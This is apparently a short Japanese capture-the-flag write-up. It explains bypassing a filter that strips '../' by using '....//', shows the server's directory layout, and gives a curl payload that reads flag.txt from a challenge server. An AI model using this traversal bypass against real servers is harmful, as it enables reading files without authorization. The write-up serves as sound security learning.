`../`が消されてしまうので、それを前提としてペイロードを考える。

消された後にディレクトリトラバーサルになっているようにすればよい。

サーバのディレクトリ構成は以下のようになっているらしい。

```
.
├── flag.txt
└── app
    ├── Dockerfile
    ├── app.py
    └── images
        ├── blue.png
        ├── green.png
        ├── notfound.png
        ├── pink.png
        ├── red.png
        └── yellow.png
```

攻撃ペイロードは以下。

```bash
curl http://34.170.146.252:25651/member?img=....//....//....//flag.txt
```